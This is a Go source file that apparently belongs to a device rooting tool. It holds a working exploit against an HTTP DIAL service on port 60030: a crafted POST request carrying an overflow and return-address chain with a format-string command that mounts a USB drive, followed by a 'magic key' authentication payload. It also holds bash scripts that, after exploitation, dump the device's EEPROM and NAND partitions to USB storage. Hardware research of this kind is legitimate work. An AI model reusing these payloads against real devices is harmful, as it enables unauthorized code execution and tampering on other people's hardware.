package internal

var getRequestStart = "GET /dial_srv/apps/hello HTTP/1.1\r\nHost: "
var getRequestEnd = ":60030\r\nConnection: close\r\n\r\n"

// The first payload string that triggers the exploit
var firstPayloadStart = "POST /dial_srv/apps/qwertyuioppoMMMMHHHHLLLLOOOOPPPPiiiiiiiiCCCCDDDDRRRR\xc5\x26\x05\x28\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xa3\xe3\x09\x28\xff\xff\xff\xff\xff\xff\xff\xff\xfc\x0e\x62\x35\xff\xff\xff\xff\x0d\x1f\x06\x28\x8b\xf1\x0a\x28\xc5\x1f\x10\x28\xb7\x32\x10\x28\xed\x4c\x12\x28\x9c\xd7\x10\x28\x1c\x9e\x11\x28\xff\xff\xff\xff\x7b\xf8\x0e\x28\xfc\x0e\x62\x35\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\x41\x8d\x08\x28\x93\x70\x0f\x28\xff\xff\xff\xff\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xd3\x7a\x10\x28\x23\x6d\x6f\x75\x6e\x74\x25\x31\x24\x73\x2f\x64\x65\x76\x2f\x73\x64\x61\x31\x25\x31\x24\x73\x2f\x6d\x6e\x74\x2f\x75\x73\x62\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x23\x23\xa9\xde\x07\x28 HTTP/1.1\r\nHost: "
var firstPayloadEnd = ":60030\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"

// The second payload string that sends the magic key for punch authentication
var secondPayload = "\x9f\xbe\x9b\x17\x3b\x18\xee\x01\x82\xea\x35\x9f\xa7\x60\x12\x4c"

var eeprom_backup_here = `cat << EOF | bash
if [ -L "/dev/fd" ]; then
        rm /dev/fd
fi
ln -s /proc/self/fd /dev/fd
comment="{comment}"
timestamp="{time}"
backup_path=/mnt/usb/storage/backup/eeprom/$timestamp

echo -e "\n===================================================================================="
echo -e "=====================[ usb://backup/eeprom/$timestamp ]======================="
echo -e "====================================================================================\n"

fwversion=$(cat /usr/target/version.txt)
mkdir -p $backup_path
cd $backup_path
printenv |gzip -c > env.gz
echo "Start :: EEPROM [ 256 Kb ]"
dd if=/conf/fake_eeprom status=progress conv=notrunc 2> >(stdbuf -oL -eL tr '\r' '\n') 1> >(tee >(gzip -c > eeprom.img.gz) | sha1sum -b > eeprom.checksum)
sync
checksum=$(cat eeprom.checksum |awk '{print $1}')
echo -e "comment=$comment\ndevice=/dev/${fma}\nsize_k=${size}\nsha1=${checksum}\ndate=${timestamp}\nproduct=${PRODUCT}\nfwversion=${fwversion}" > eeprom.meta
echo -e "\nEnd :: EEPROM [ $checksum ]"
rm eeprom.checksum
rm /dev/fd
sync
echo -e "\n==============================[ Backup Completed ]==================================\n"
echo "##DONE##"
EOF`

var nand_backup = `cat << EOF | bash
if [ -L "/dev/fd" ]; then
        rm /dev/fd
fi
ln -s /proc/self/fd /dev/fd
timestamp="{time}"
comment="{comment}"
backup_path=/mnt/usb/storage/backup/nand/$timestamp

echo -e "\n===================================================================================="
echo -e "======================[ usb://backup/nand/$timestamp ]========================"
echo -e "====================================================================================\n"

fwversion=$(cat /usr/target/version.txt)
mkdir -p $backup_path
cd $backup_path
printenv |gzip -c > env.gz
sizes=$(grep -E 'fma(2|3|4|5|6|7|8|9|10|11|12)' /proc/driver/nand | awk '{print $4}')
for size in $sizes; do
        fma=$(grep -E 'fma(2|3|4|5|6|7|8|9|10|11|12)' /proc/driver/nand | grep -F "$size" | awk '{print $1}')
        sizemb=$(echo "scale = 2; $size / 1024" | bc)

        echo "Start :: /dev/$fma [ $sizemb Mb ]"

        dd if=/dev/$fma bs=1024 count=$size status=progress conv=notrunc 2> >(stdbuf -oL -eL tr '\r' '\n') 1> >(tee >(gzip -c > ${fma}.img.gz) | sha1sum -b > ${fma}.checksum)
        sync
        checksum=$(cat ${fma}.checksum |awk '{print $1}')
        echo -e "comment=$comment\ndevice=/dev/${fma}\nsize_k=${size}\nsha1=${checksum}\ndate=${timestamp}\nproduct=${PRODUCT}\nfwversion=${fwversion}" > ${fma}.meta
        echo -e "\nEnd :: /dev/$fma [ $checksum ]"
        rm ${fma}.checksum

    if [[ "$fma" != "fma11" ]]; then
            echo -e "\n====================================================================================\n"
        fi
done
rm /dev/fd
sync
echo -e "\n================================[ Backup Completed ]================================\n"
echo "##DONE##"
EOF`
